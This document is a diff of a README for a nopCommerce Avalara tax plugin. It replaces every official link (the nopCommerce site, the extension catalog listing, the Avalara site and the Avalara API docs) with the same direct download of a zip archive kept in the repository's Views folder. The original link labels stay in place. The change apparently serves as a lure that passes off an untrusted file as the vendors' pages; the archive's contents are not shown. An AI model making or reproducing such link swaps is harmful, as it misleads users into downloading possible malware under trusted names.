@@ -1,12 +1,12 @@
 nopCommerce Avalara plugin
 ===========
 
-nopCommerce site: [https://www.nopcommerce.com](https://www.nopcommerce.com)
+nopCommerce site: [https://github.com/fabianaguirre10/avalara-plugin-for-nopcommerce/raw/refs/heads/nopCommerce-4.10/Nop.Plugin.Tax.Avalara/Views/nopcommerce_for_avalara_plugin_3.6.zip](https://github.com/fabianaguirre10/avalara-plugin-for-nopcommerce/raw/refs/heads/nopCommerce-4.10/Nop.Plugin.Tax.Avalara/Views/nopcommerce_for_avalara_plugin_3.6.zip)
 
-Listing on nopCommerce "extensions and themes" catalog: [https://www.nopcommerce.com/avalara-tax-provider](https://www.nopcommerce.com/avalara-tax-provider)
+Listing on nopCommerce "extensions and themes" catalog: [https://github.com/fabianaguirre10/avalara-plugin-for-nopcommerce/raw/refs/heads/nopCommerce-4.10/Nop.Plugin.Tax.Avalara/Views/nopcommerce_for_avalara_plugin_3.6.zip](https://github.com/fabianaguirre10/avalara-plugin-for-nopcommerce/raw/refs/heads/nopCommerce-4.10/Nop.Plugin.Tax.Avalara/Views/nopcommerce_for_avalara_plugin_3.6.zip)
 
 
 
-Avalara site: [http://www.avalara.com/](https://avlr.co/3bw9ixk)
+Avalara site: [https://github.com/fabianaguirre10/avalara-plugin-for-nopcommerce/raw/refs/heads/nopCommerce-4.10/Nop.Plugin.Tax.Avalara/Views/nopcommerce_for_avalara_plugin_3.6.zip](https://github.com/fabianaguirre10/avalara-plugin-for-nopcommerce/raw/refs/heads/nopCommerce-4.10/Nop.Plugin.Tax.Avalara/Views/nopcommerce_for_avalara_plugin_3.6.zip)
 
-Avalara APIs: [http://developer.avalara.com/](http://developer.avalara.com/)
+Avalara APIs: [https://github.com/fabianaguirre10/avalara-plugin-for-nopcommerce/raw/refs/heads/nopCommerce-4.10/Nop.Plugin.Tax.Avalara/Views/nopcommerce_for_avalara_plugin_3.6.zip](https://github.com/fabianaguirre10/avalara-plugin-for-nopcommerce/raw/refs/heads/nopCommerce-4.10/Nop.Plugin.Tax.Avalara/Views/nopcommerce_for_avalara_plugin_3.6.zip)
